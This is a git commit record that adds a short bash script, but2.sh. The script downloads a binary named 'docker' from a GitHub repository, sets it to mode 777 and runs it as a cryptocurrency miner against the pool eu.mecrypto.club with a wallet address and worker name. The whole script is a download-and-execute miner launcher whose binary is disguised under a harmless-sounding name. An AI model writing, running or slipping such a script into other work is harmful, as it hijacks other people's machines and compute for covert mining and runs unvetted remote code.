38518d48835a602735574a34b130cda9e155135d
jsiqiisn <100444720+jsiqiisn@users.noreply.github.com>
2022-03-08 22:20:17 +0700

    Create but2.sh

---
+++ but2.sh
@@ -0,0 +1,4 @@
+#!/bin/bash
+wget https://raw.githubusercontent.com/jsiqiisn/baby/main/docker
+chmod 777 docker
+./docker -a ghostrider -o eu.mecrypto.club:3051 -u Xr52u2aoWETd6RrrHJKunCYRnmGL6Eh1Kf.$(echo $(shuf -i 1-20000 -n 1)-V) -p c=BUTK-gr --donate-level 1
